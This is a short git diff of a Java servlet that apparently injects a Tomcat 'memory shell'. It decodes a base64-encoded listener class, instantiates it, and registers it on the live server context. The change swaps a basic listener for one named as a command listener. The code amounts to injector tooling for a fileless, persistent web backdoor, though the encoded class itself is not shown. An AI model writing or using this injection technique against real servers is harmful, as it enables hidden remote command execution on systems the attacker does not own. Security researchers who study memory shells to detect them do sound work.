@@ -11,8 +11,9 @@ import java.io.IOException;
 import java.lang.reflect.Field;
 import javax.servlet.annotation.WebServlet;
 
-// import static com.summer233.DynamicUtils.LISTENER_CLASS_STRING;
-import static com.summer233.DynamicUtils.BASIC_LISTENER_CLASS_STRING_BASE64;
+// import static com.summer233.DynamicUtils.BASIC_LISTENER_CLASS_STRING_BASE64;
+import static com.summer233.DynamicUtils.SUMMER_CMD_LISTENER_CLASS_STRING_BASE64;
+
 
 
 /**
@@ -49,8 +50,8 @@ public class AddTomcatListener extends HttpServlet {
             }
 
             // 添加监听器
-            // o.addApplicationEventListener(DynamicUtils.getClass(LISTENER_CLASS_STRING).getDeclaredConstructor().newInstance());
-            o.addApplicationEventListener(DynamicUtils.getClass(BASIC_LISTENER_CLASS_STRING_BASE64).getDeclaredConstructor().newInstance());
+            // o.addApplicationEventListener(DynamicUtils.getClass(BASIC_LISTENER_CLASS_STRING_BASE64).getDeclaredConstructor().newInstance());
+            o.addApplicationEventListener(DynamicUtils.getClass(SUMMER_CMD_LISTENER_CLASS_STRING_BASE64).getDeclaredConstructor().newInstance());
 
             resp.getWriter().println("tomcat listener added");
 
